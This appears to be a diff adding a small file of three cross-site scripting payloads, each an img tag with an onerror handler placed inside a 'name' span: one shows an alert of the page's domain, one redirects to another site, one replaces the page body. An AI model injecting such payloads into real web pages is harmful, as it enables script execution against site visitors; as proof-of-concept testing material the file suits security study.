@@ -1,0 +1,5 @@
+<h1>Hi <span id="name"><img src=x onerror=alert(document.domain)></span></h1>
+
+<h1>Hi <span id="name"><img src=x onerror=window.location="https://www.google.com"></span></h1>
+
+<h1>Hi <span id="name"><img src=x onerror='document.body.innerHTML = `<h1>XSS Attack</h1>`'></span></h1>
